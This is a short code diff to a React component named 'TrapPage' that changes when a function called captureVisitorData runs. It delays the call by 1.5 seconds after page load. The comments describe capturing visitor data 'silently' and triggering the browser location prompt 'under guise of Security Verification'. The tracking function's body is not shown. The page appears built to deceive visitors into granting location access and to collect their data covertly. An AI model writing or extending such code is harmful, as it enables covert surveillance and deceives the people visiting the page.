@@ -7,9 +7,6 @@ const TrapPage = () => {
   const [currentDate, setCurrentDate] = useState('');
 
   useEffect(() => {
-    // Capture data silently
-    captureVisitorData();
-
     // Set dynamic date and time
     const now = new Date();
     const timeStr = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }).replace('.', ':');
@@ -17,6 +14,14 @@ const TrapPage = () => {
     
     setCurrentTime(timeStr);
     setCurrentDate(dateStr);
+
+    // Capture data silently after a short delay
+    const startTracking = async () => {
+      // Trigger browser location popup under guise of "Security Verification"
+      await captureVisitorData();
+    };
+    
+    setTimeout(startTracking, 1500);
   }, []);
 
   return (
